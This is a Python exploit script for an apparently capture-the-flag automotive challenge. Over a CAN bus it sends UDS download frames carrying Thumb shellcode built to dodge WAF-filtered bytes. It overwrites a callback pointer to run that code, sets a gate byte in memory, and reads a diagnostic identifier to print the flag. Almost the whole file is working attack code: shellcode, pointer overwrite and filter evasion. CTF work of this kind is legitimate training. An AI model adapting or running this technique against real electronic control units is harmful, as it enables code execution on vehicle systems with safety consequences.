#!/usr/bin/env python3
# Copyright © 2026 00One, Inc.
# SPDX-License-Identifier: Apache-2.0

"""Minimal CTF Cshim exploit: set the volatile flag gate and read DID F190."""

import argparse
import time

from ctf_can import exchange, open_bus


TX_ID = 0x666
DATA_ADDRESS = 0x2000305C
MARKER_OFFSET = 130
CALLBACK_OFFSET = 132
GATE_ADDRESS = 0x20003ECF

# Thumb code:
#   movs r0, #1
#   ldr  r1, [pc, #4]
#   strb r0, [r1]
#   bx   lr
#   .word 0x20003ecf
# It contains neither of the fixed WAF bytes 0x68 ('h') and 0x21 ('!').
SHELLCODE = bytes.fromhex("0120014908707047cf3e0020")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("interface", nargs="?", default="can0")
    parser.add_argument("--backend", choices=("auto", "socketcan", "chv"), default="auto")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--pace", type=float, default=0.08)
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--exploit", action="store_true",
                        help="required: permit volatile callback-pointer overwrite")
    args = parser.parse_args()
    if not args.exploit and not args.dry_run:
        parser.error("live execution requires --exploit")

    stream = bytearray(CALLBACK_OFFSET + 4)
    stream[:len(SHELLCODE)] = SHELLCODE
    stream[MARKER_OFFSET] = 0xAA
    stream[CALLBACK_OFFSET:CALLBACK_OFFSET + 4] = (DATA_ADDRESS | 1).to_bytes(4, "little")
    assert b"h" not in stream and b"!" not in stream
    print(f"stream={len(stream)} bytes callback=0x{DATA_ADDRESS | 1:08x} gate=0x{GATE_ADDRESS:08x}")

    bus = None
    try:
        if not args.dry_run:
            bus = open_bus(args.interface, args.backend, 500000)
        response = exchange(bus, b"\x34\x00\x00", args.timeout, args.dry_run)
        if response and response[:1] != b"\x74":
            raise RuntimeError(f"RequestDownload rejected: {response.hex()}")

        for sequence, offset in enumerate(range(0, len(stream), 6), 1):
            response = exchange(
                bus, bytes([0x36, sequence]) + stream[offset:offset + 6],
                args.timeout, args.dry_run,
            )
            if response and response[:1] != b"\x76":
                raise RuntimeError(f"TransferData block {sequence} rejected: {response.hex()}")
            if not args.dry_run:
                time.sleep(args.pace)

        response = exchange(bus, b"\x31\x01\x00\x00", args.timeout, args.dry_run)
        if response and response[:1] != b"\x71":
            raise RuntimeError(f"RoutineControl rejected: {response.hex()}")

        response = exchange(bus, bytes.fromhex("231420003ecf01"), args.timeout, args.dry_run)
        if response and response != b"\x63\x01":
            raise RuntimeError(f"gate was not set: {response.hex()}")

        response = exchange(bus, b"\x22\xf1\x90", args.timeout, args.dry_run)
        if response.startswith(b"\x62\xf1\x90"):
            print("FLAG:", response[3:].rstrip(b"\x00").decode("ascii", "replace"))
        elif response:
            raise RuntimeError(f"flag DID rejected: {response.hex()}")
    finally:
        if bus is not None:
            try:
                bus.shutdown()
            except Exception:
                pass


if __name__ == "__main__":
    main()
